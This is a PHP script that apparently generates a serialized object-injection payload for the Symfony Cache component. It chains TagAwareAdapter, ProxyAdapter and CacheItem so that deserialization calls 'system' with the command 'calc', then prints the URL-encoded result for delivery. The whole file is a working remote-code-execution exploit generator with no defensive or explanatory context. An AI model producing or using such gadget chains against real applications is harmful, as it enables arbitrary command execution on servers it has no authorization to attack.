<?php
namespace Symfony\Component\Cache\Adapter{
    class TagAwareAdapter{
        private $deferred;
        private $pool;
        function __construct($deferred, $pool){
            $this->deferred = $deferred;
            $this->pool = $pool;
        }

    }
    class ProxyAdapter{
        private $setInnerItem;
        private $poolHash;
        function __construct($setInnerItem, $poolHash){
            $this->setInnerItem = $setInnerItem;
            $this->poolHash = $poolHash;
        }
    }
}

namespace Symfony\Component\Cache{
    final class CacheItem{
        protected $expiry;
        protected $poolHash;
        protected $innerItem;

        function __construct($expiry, $poolHash, $innerItem){
            $this->expiry = $expiry;
            $this->poolHash = $poolHash;
            $this->innerItem = $innerItem;
        }
    }
}

namespace{
    $b = new Symfony\Component\Cache\Adapter\ProxyAdapter('system', 1);
    $d = new Symfony\Component\Cache\CacheItem(1, 1, "calc");
    $a = new Symfony\Component\Cache\Adapter\TagAwareAdapter(array($d),$b);
    echo urlencode(serialize($a));
}
